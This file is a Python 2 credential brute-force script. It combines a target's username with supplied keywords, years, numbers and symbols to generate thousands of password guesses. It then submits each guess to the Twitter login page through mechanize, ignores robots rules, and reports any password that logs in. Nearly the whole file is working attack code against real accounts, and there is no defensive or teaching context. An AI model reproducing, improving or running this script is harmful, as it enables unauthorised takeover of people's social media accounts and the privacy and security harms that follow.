import socket
import os
import time
import cookielib
from time import strftime
from time import *
import time
import random
import argparse
try:
	import mechanize
except ImportError:
	print "{-} Please install the mechanize module. pip2 install mechanize"
tested = []
generated = []
matches = []
def args():
    global args
    parser = argparse.ArgumentParser()
    parser.add_argument('-e', '--user', help="email")
    parser.add_argument('-u', '--uname', help="On instagram, some people use their email as username. However, for an attack like this it's not good to use the email in the wordlist. Enter their username on other social medias, Example: richard_06") 
    parser.add_argument('-k1', '--keyword1', help="Make a wordlist from keywords")
    parser.add_argument('-k2', '--keyword2', help="2nd Keyword to use when generating combinations")
    parser.add_argument('-k3', '--keyword3', help="3rd Keyword to use when generating combinations")
    args = parser.parse_args()
    if args.uname == None:
        print "Username to use in combinations not specified"
        quit()
    if args.user == None:
        print "Email not specified"
        quit()
    if args.keyword1 == None:
        print "Keyword1 not specified."
        quit()
    if args.keyword2 == None:
        print "Keyword2 not specified."
        quit()
    if args.keyword3 == None:
        generic =  ["football", "love", "soccer", "password"]
        veryrandom = random.choice(generic)
        print "Keyword3 -->", veryrandom
        args.keyword3 = veryrandom
def fbrt():
        global args
	br = mechanize.Browser()
        years = ["2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007", "2008", "2009", "2010", "2011", "2012",
             "2013", "2014", "2015", "2016", "2017", "2018", "2019", "2020"]
        specialchars = ["#", ".", "_", "-", "$", "/"]
        nums = ['05', '04', '03', '02', '01', '123', '321', '999', '909', '987', '567', '543', '0123', '9870', '999000', '55555', '99999']
        keyword = str(args.keyword1)
        keyword2 = str(args.keyword2)
        keyword3 = str(args.keyword3)
        ssid = str(args.uname)
        print "Generating combinations.."
        for yrs in years:
            for num in nums:
                for specialchar in specialchars:
                    generated.append(keyword)
                    generated.append(keyword + num )
                    generated.append(keyword2)
                    generated.append(keyword2 + yrs)
                    generated.append(keyword2 + num)
                    generated.append(keyword2 + specialchar)
                    generated.append(keyword3)
                    generated.append(keyword3 + yrs)
                    generated.append(keyword3 + num)
                    generated.append(keyword3 + specialchar)
                    generated.append(keyword + keyword2)
                    generated.append(keyword.replace('s', '$'))
                    generated.append(keyword2.replace('s', '$'))
                    generated.append(keyword.replace('s', '$') + '_' + keyword2)
                    generated.append(keyword.replace('s', '$') + '_' + keyword2.replace('a', '4'))
                    generated.append(keyword2 + keyword)
                    generated.append(keyword2 + '_' + keyword)
                    generated.append(keyword2.replace('o', '0'))
                    generated.append(keyword.replace('o', '0'))
                    generated.append(str(keyword) + yrs) 
                    generated.append(str(keyword))
                    generated.append(str(args.uname) + str(keyword))
                    generated.append(str(args.uname))
                    generated.append(str(args.uname) + yrs)
                    generated.append(ssid + "_" + yrs)
                    generated.append(ssid + "." + yrs)
                    generated.append(ssid + yrs)
                    generated.append(ssid + num)
                    generated.append(ssid + specialchar)
                    generated.append(ssid + '_' + yrs)
                    generated.append(num + ssid)
                    generated.append(keyword + num)
                    generated.append(keyword + yrs) 
                    generated.append(keyword + specialchar)
                    generated.append(num + keyword)
                    generated.append(yrs + keyword)
                    generated.append(keyword + ssid)
                    generated.append(ssid + keyword)
                    generated.append(keyword + '_' + num)
                    generated.append(keyword + '.' + num)
                    generated.append(keyword + specialchar + num)	
	useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
	email = str(args.user)
	br.addheaders = [('User-agent', random.choice(useragents))]
	cj = cookielib.LWPCookieJar()
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_redirect(True)
	br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.set_cookiejar(cj)
	url = "https://www.twitter.com/login"
	br.open(url)
	print "[*] Attack Started at: " + strftime ("%a, %d %b %Y %H:%M:%S", gmtime())
	time.sleep(0.5)
	for password in generated:
	    br.select_form(nr=0)
	    br.form['session[username_or_email]'] = email
	    br.form['session[password]'] = password.strip()
            r = br.submit()
	    if (r.geturl() != url) and ('login' not in r.geturl()):
		print "\nMatch found:",password
		matches.append(password)
		break
                quit()
            else:
                    tested.append(password)
                    print "Tested",len(tested),"of",len(generated)
def check_matches():
    if len(matches) < 1:
            print "No Matches Found"
            quit()
args()
fbrt()
check_matches()

